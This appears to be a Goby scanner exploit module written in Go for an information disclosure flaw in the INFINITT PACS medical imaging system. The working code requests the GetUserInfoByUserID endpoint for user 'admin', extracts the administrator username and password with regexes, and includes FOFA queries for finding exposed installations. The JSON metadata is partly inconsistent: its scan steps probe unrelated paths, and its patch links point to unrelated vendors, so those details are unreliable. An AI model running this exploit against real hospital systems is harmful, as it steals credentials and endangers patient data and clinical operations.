package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "The feida image archiving and communication system (PACS) /webservices/WebUserLogin.asmx/GetUserInfoByUserID Information Disclosure Vulnerability",
    "Description": "<p>Infeta is a company specializing in the development of medical imaging systems, the products cover radiology, ultrasound, endoscopy, pathology, electrophysiology, radiotherapy and other examination medical technology departments, ecological support for single hospital, multi-hospital, regional, medical association, group, mobile terminal, cloud, Internet applications. The Infanta Image Archiving and Communication (PACS) system has a vulnerability that could allow an attacker to gain access to administrator information and gain control of the entire system.</p>",
    "Product": "INFINITT",
    "Homepage": "https://www.infinitt.vip/icnweb/",
    "DisclosureDate": "2024-10-17",
    "PostTime": "2024-10-17",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"INFINITT\" || body=\"ris-icon\"&&body=\" ris-infinitt\" || title=\"ULite\"",
    "GobyQuery": "title=\"INFINITT\" || body=\"ris-icon\"&&body=\" ris-infinitt\" || title=\"ULite\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://www.infinitt.vip/icnweb/\">https://www.infinitt.vip/icnweb/</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143018118"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine;.js",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "英飞达影像存档与通讯(PACS)系统 /webservices/WebUserLogin.asmx/GetUserInfoByUserID 信息泄露漏洞",
            "Product": "英飞达影像存档与通讯(PACS)系统 ",
            "Description": "<p>英飞达是一家专业开发医学影像系统的公司，产品覆盖放射、超声、内镜、病理、电生理、放疗等所有检查医技科室，生态支持单院区、多院区、区域、医联体、集团化、移动端、云端、互联网应用。英飞达影像存档与通讯(PACS)系统存在信息泄露漏洞，攻击者可以通过该漏洞获取管理员信息，进而登录控制整个系统。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.infinitt.vip/icnweb/\">https://www.infinitt.vip/icnweb/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "The feida image archiving and communication system (PACS) /webservices/WebUserLogin.asmx/GetUserInfoByUserID Information Disclosure Vulnerability",
            "Product": "INFINITT",
            "Description": "<p>Infeta is a company specializing in the development of medical imaging systems, the products cover radiology, ultrasound, endoscopy, pathology, electrophysiology, radiotherapy and other examination medical technology departments, ecological support for single hospital, multi-hospital, regional, medical association, group, mobile terminal, cloud, Internet applications. The Infanta Image Archiving and Communication (PACS) system has a vulnerability that could allow an attacker to gain access to administrator information and gain control of the entire system.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://www.infinitt.vip/icnweb/\">https://www.infinitt.vip/icnweb/</a><br></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_pS4fQ3mZ8rR4 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(resp.Utf8Html, "PASSWORD") {
			return "", errors.New("no information")
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin": "PASSWORD",
			}
			// 函数继承
			uploadFileFunc := postOrGet_pS4fQ3mZ8rR4

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin", "PASSWORD"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_pS4fQ3mZ8rR4

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular_name := `<USERID>([^"]+)</USERID>`
			regular_pwd := `<PASSWORD>([^"]+)</PASSWORD>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				if len(getname) > 1 {
					return getname[1], nil // 返回第一个捕获组的内容
				}
				return getname[1], fmt.Errorf("no value found")
			}


			output_name, err := makeRegular(resp, regular_name)
			output_pwd, err := makeRegular(resp, regular_pwd)

			if err != nil {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "账号：" + output_name + "\n" + "密码：" + output_pwd
			return expResult


		},
	))
}
